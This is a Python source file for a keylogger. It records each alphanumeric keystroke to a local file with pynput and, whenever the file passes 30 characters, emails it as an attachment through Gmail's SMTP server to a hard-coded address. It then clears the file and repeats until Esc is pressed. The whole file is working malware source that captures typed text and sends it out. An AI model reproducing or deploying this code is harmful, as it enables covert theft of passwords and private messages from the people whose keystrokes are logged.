def sendemail():
#     time.sleep(5)
    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders

    fromaddr = "ankitinfinitywar@gmail.com"
    toaddr = "161210010@nitdelhi.ac.in"

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "send a key press"

    body = "hey buddy again "

    msg.attach(MIMEText(body, 'plain'))

    filename = "NAME OF THE FILE WITH ITS EXTENSION"
    attachment = open("ank.txt", "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "***********")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()
    
import time
import os
from pynput import keyboard

def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
        f=open("ank.txt",'a')
        f.write(key.char)
        f.seek(0, os.SEEK_END)
        size = f.tell() 
        if size>30:
            sendemail()
            f = open('ank.txt', 'r+')
            f.truncate(0)
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listenerasjjjndsjd
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

